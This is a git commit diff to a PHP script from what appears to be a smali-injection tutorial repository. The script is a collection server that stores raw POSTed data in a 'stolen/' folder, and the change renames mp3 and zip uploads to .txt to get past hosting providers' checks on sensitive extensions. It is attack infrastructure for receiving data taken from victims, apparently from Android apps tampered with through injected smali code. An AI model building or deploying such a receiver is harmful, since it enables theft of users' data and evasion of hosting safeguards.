a754237780c44782110cce2cc2cb1830d79356e6
hung0125 <65654501+hung0125@users.noreply.github.com>
2021-02-08 12:22:59 +0800

    Update file.php

--- tutorials/smali_injection/Special!!/server use/file.php
+++ tutorials/smali_injection/Special!!/server use/file.php
@@ -4,16 +4,27 @@ $inp = file_get_contents("php://input");
 
 $ok = true;
 $file = scandir("stolen/");
-if(sizeof($file) >= 30)
+if (sizeof($file) >= 30)
 {
-$ok = false;
+    $ok = false;
 }
 
-if($inp != "" && strlen($fname) > 0 && $ok)
+if ($inp != "" && strlen($fname) > 0 && $ok)
 {
-$p = "stolen/" . $fname . ".html";
-file_put_contents($p, $inp);
-chmod($p, 0640);
+    $tmp = explode(".", $fname);
+    $ext = $tmp[sizeof($tmp) - 1];
+    //Sensitive extensions for some web service providers
+    if ($ext == "mp3" || $ext == "zip")
+    {
+        $p = "stolen/" . $fname . ".txt";
+    }
+    else
+    {
+        $p = "stolen/" . $fname;
+    }
+
+    file_put_contents($p, $inp);
+    chmod($p, 0640);
 }
 
 $oldCount = file_get_contents('count_fileclick.txt');
